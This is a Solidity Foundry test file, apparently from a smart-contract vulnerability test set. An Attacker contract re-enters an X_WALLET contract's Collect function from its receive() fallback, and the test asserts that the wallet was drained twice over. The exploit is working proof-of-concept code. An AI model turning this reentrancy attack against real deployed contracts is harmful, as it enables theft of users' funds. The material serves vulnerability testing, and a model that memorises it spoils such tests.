
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyX_WALLET is Test {
    using stdStorage for StdStorage;
    
    X_WALLET public _contractUnderTest;
    Log public _logContract;
    
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new X_WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);
        
        address attackerAddress = address(_attacker);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(attackerAddress, attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    X_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(block.timestamp - 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);
        
        if (address(this).balance >= initialSnapshot + (storedAttackVal * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
